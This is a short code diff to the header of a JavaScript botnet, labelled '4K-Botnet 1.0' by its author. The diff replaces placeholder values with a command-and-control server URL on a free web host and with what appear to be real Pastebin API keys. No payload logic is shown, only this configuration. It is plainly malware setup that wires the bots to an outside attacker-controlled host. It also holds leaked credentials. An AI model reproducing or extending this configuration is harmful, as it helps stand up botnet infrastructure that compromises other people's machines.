@@ -1,8 +1,8 @@
 //4K-Botnet 1.0 by Chowix40
 //I know it's still crap but it (or should) works better
-var SERVER_URL = 'http://example.net/Botnet/'
-var api_dev_key = '<pastebin api_dev_key here>'
-var api_user_key = '<pastebin api_user_key here>'
+var SERVER_URL = 'http://darkwebmalware.000webhostapp.com/'
+var api_dev_key = 'aa658492aa233eb8a61de848bad328a7'
+var api_user_key = 'aa658492aa233eb8a61de848bad328a7'
 
 
 
